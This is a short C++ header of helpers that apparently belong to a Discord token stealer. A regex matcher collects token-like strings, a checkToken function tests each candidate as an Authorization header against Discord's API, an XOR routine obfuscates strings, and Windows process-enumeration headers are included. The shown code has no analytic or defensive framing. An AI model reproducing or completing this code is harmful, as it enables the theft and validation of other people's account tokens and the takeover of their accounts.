#pragma once
#include <Windows.h>
#include <cpr/cpr.h>
#include <string>
#include <process.h>
#include <TlHelp32.h>
#include <iostream>

std::vector<std::string> findMatch(std::string str, std::regex reg)
{
	std::vector<std::string> output;
	std::sregex_iterator currentMatch(str.begin(), str.end(), reg);
	std::sregex_iterator lastMatch;

	while (currentMatch != lastMatch) {
		std::smatch match = *currentMatch;
		output.push_back(match.str());
		currentMatch++;
	}
	return output;
}

bool pathExists(const std::string& s)
{
	struct stat buffer;
	return (stat(s.c_str(), &buffer) == 0);
}

bool checkToken(const std::string& match) {

	cpr::Response res = cpr::Get(cpr::Url{ "https://discordapp.com/api/v9/channels/@me" },
		cpr::Header{ {"Content-Type", "application/json"}, {"Authorization", match} });
	if (res.status_code == 400)
		return true;
	return false;
}

std::string xorstring(std::string input, std::string const& key) {
	if (key.size() == 0) return input;
	for (uint32_t i = 0; i < input.size(); i++)
		input[i] ^= key[i % key.length()];
	return input;
}
